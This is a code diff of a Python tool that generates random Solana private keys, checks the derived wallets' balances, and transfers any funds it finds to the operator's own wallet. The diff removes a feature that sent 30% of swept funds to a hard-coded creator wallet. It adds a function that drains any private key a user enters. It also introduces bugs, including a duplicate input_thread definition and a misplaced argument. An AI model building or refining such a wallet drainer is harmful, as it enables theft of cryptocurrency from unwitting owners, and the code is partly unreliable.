@@ -47,18 +47,12 @@ YOUR_WALLET = config["YOUR_WALLET"]
 REQUEST_DELAY = config["REQUEST_DELAY"]
 RPC_RETRIES = config.get("RPC_RETRIES", 3)
 RPC_RETRY_DELAY = config.get("RPC_RETRY_DELAY", 2)
-CHECK_TOKENS = config.get("CHECK_TOKENS", False)
-DONATE = config.get("DONATE", False)
-DONATION_PERCENTAGE = config.get("DONATION_PERCENTAGE", 30)  # e.g., 30 means 30%
 
-# Donation wallet (creator's wallet)
-DONATION_WALLET = "5oGcPFDdgYptfAPckr5yYcfG5f83CCfXah8bVQNAjjo9"
-
-# --- Setup RPC client ---
+# Solana RPC endpoint
 SOLANA_RPC = config["RPC_SERVER"]
 client = Client(SOLANA_RPC)
 
-# Files to log wallet details and outputs
+# Files to save wallet details and command outputs
 WALLET_LOG_FILE = "found_wallets.txt"
 POTENTIAL_WALLET_FILE = "potential.txt"
 COMMAND_OUTPUT_FILE = "output_command.txt"
@@ -66,12 +60,12 @@ COMMAND_OUTPUT_FILE = "output_command.txt"
 # Flag to pause/resume the main loop
 pause_generation = False
 
-# --- Utility functions ---
 def wait_for_rpc():
     """Wait until the RPC endpoint is healthy before resuming generation."""
     print("RPC error encountered. Pausing generation until RPC node is healthy...")
     while True:
         try:
+            # Check the health; get_health() should return {"result": "ok"} when healthy.
             health = client.get_health()
             if health and health.get("result") == "ok":
                 print("RPC node is healthy. Resuming generation...")
@@ -90,6 +84,7 @@ def with_rpc_retry(func):
             except SolanaRpcException as e:
                 print(f"RPC error on attempt {attempt+1}/{RPC_RETRIES} in {func.__name__}: {e}")
                 time.sleep(RPC_RETRY_DELAY)
+        # If all retries fail, wait for the RPC to recover before retrying once more.
         wait_for_rpc()
         return func(*args, **kwargs)
     return wrapper
@@ -99,7 +94,8 @@ def generate_ed25519_keypair():
     seed = os.urandom(32)
     signing_key = SigningKey(seed)
     private_key = signing_key._signing_key
-    return base58.b58encode(private_key).decode('utf-8')
+    private_key_base58 = base58.b58encode(private_key).decode('utf-8')
+    return private_key_base58
 
 def base58_to_ed25519_keypair(private_key_base58):
     """Convert a Base58-encoded Ed25519 private key to a Keypair.
@@ -108,16 +104,18 @@ def base58_to_ed25519_keypair(private_key_base58):
         private_key_bytes = base58.b58decode(private_key_base58)
         if len(private_key_bytes) != 64:
             raise ValueError("Invalid Ed25519 private key length. Expected 64 bytes.")
-        return Keypair.from_secret_key(private_key_bytes)
+        keypair = Keypair.from_secret_key(private_key_bytes)
+        return keypair
     except Exception as e:
         print(f"Error decoding private key: {e}")
         return None
 
 def private_key_to_wallet(private_key):
-    """Convert a private key string to a wallet address and Keypair."""
-    keypair = base58_to_ed25519_keypair(private_key)
-    if keypair is None:
-        return None, None
+    """Convert a private key to a Solana wallet address."""
+    if isinstance(private_key, str):
+        keypair = base58_to_ed25519_keypair(private_key)
+    else:
+        keypair = Keypair.from_secret_key(private_key)
     return str(keypair.public_key), keypair
 
 @with_rpc_retry
@@ -126,7 +124,8 @@ def check_wallet_balance(wallet_address):
     pubkey = Pubkey.from_string(wallet_address)
     balance_response = client.get_balance(pubkey)
     balance_lamports = balance_response.value if balance_response else 0
-    return balance_lamports / 1_000_000_000
+    balance_sol = balance_lamports / 1_000_000_000
+    return balance_sol
 
 @with_rpc_retry
 def check_wallet_transactions(wallet_address):
@@ -201,24 +200,41 @@ def log_wallet_details(private_key, wallet_address, balance_sol, token_balances=
                     f.write(f"  Mint: {token['mint']}, Name: {token['name']}, Amount: {token['amount']}\n")
             f.write("-" * 40 + "\n")
 
-def process_funds(keypair, balance_sol):
-    """
-    Process sending funds from a wallet.
-    If donation is enabled, donate a percentage to the creator's wallet,
-    then send the remaining balance to YOUR_WALLET.
-    """
-    if DONATE:
-        donation_amount = balance_sol * (DONATION_PERCENTAGE / 100)
-        remaining_amount = balance_sol - donation_amount
-        if donation_amount > 0:
-            if send_sol(keypair, DONATION_WALLET, donation_amount):
-                print(f"Donated {donation_amount} SOL to creator.")
-        if remaining_amount > 0:
-            if send_sol(keypair, YOUR_WALLET, remaining_amount):
-                print(f"Transferred {remaining_amount} SOL to your wallet.")
-    else:
-        if send_sol(keypair, YOUR_WALLET, balance_sol):
-            print(f"Transferred {balance_sol} SOL to your wallet.")
+def check_wallet_command(private_key):
+    """Check a wallet using a private key and save the output."""
+    global pause_generation
+    pause_generation = True  # Pause the main loop
+    try:
+        wallet_address, keypair = private_key_to_wallet(private_key)
+        if not keypair:
+            output = "Invalid private key.\n"
+        else:
+            balance_sol = check_wallet_balance(wallet_address)
+            has_transactions = check_wallet_transactions(wallet_address)
+            output = (
+                f"Wallet Address: {wallet_address}\n"
+                f"Balance: {balance_sol} SOL\n"
+                f"Has Transactions: {has_transactions}\n"
+            )
+            
+            if balance_sol > 0:
+                if send_sol(keypair, YOUR_WALLET, balance_sol):
+                    output += f"Transferred {balance_sol} SOL to your wallet.\n"
+            
+            if has_transactions:
+                log_wallet_details(private_key, wallet_address, balance_sol, has_transactions=True)
+        
+        with open(COMMAND_OUTPUT_FILE, "a") as f:
+            f.write(output)
+            f.write("-" * 40 + "\n")
+        
+        print(output)
+        time.sleep(10)
+    except SolanaRpcException:
+        # Although RPC calls are retried, if an exception bubbles up, wait for RPC.
+        wait_for_rpc()
+    finally:
+        pause_generation = False  # Resume the main loop
 
 # --- Input handling thread ---
 def input_thread():
@@ -271,6 +287,15 @@ def input_thread():
 
 # --- Main automatic generation loop ---
 def main():
+    def input_thread():
+        """Thread to handle user input."""
+        while True:
+            private_key = input("Enter a private key to check (or 'exit' to quit): ")
+            if private_key.lower() == "exit":
+                os._exit(0)
+            check_wallet_command(private_key)
+
+    # Start the input thread
     threading.Thread(target=input_thread, daemon=True).start()
     try:
         while True:
@@ -286,6 +311,7 @@ def main():
                 print("Invalid private key generated. Skipping...")
                 continue
 
+            # Check the wallet balance and transactions
             balance_sol = check_wallet_balance(wallet_address)
             has_transactions = check_wallet_transactions(wallet_address)
             
@@ -301,8 +327,8 @@ def main():
 
             if balance_sol > 0:
                 print(f"Found wallet with balance: {wallet_address} (Balance: {balance_sol} SOL)")
-                log_wallet_details(private_key_base58, wallet_address, balance_sol, token_balances=tokens, has_transactions=has_transactions)
-                process_funds(keypair, balance_sol)
+                log_wallet_details(private_key_base58, wallet_address, balance_sol, has_transactions)
+                send_sol(keypair, YOUR_WALLET, balance_sol)
             else:
                 print(f"Wallet {wallet_address} is empty.")
 
